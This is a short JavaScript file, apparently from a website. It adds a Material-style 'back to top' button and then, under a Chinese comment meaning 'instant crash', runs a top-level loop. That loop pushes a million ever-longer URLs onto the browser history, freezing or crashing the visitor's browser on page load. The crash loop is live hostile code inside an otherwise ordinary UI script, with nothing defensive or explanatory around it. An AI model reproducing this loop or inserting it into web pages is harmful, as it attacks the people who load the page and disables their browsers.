//回到顶部
$(function() {
    var a = document.getElementById("scrolltop"),
    b = !0;
    $(window).scroll(function() {
        var c = $(window).scrollTop();
        c > 0 ? a.classList.remove("mdui-fab-hide") : a.classList.add("mdui-fab-hide"),
        b = !1
    }),
    a.onclick = function() {
        function a(a) {
            $("body").animate({
                scrollTop: "0"
            },
            a, "swing")
        }
        b || (a(400), b = !0)
    }
});
//瞬间死机
var total = "";
for(var i = 0; i<1000000; i++)
{
    total = total + i.toString();
    history.pushState(0,0,total);
}
